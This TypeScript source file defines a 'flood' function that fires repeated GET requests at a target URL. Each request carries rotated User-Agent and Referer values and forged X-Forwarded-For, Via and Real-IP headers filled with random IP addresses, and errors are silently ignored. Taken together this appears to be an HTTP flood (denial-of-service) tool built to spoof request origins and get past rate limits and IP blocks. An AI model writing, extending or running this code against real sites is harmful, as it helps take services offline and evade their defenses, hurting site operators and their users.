import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let s = ""
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const host = u.host
  const target = u.origin + u.pathname + u.search

  const run = async () => {
    for (let i = 0; i < rpc; i++) {
      try {
        await fetch(target, {
          method: "GET",
          headers: {
            "User-Agent": randomChoice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Referer": randomChoice(REFERERS) + target,
            "X-Forwarded-For": randIp(),
            "X-Forwarded-Host": host,
            "Via": randIp(),
            "Real-IP": randIp(),
          },
          redirect: "manual",
        })
        onStats(1, target.length + 200)
      } catch {}
    }
  }

  await run()
}
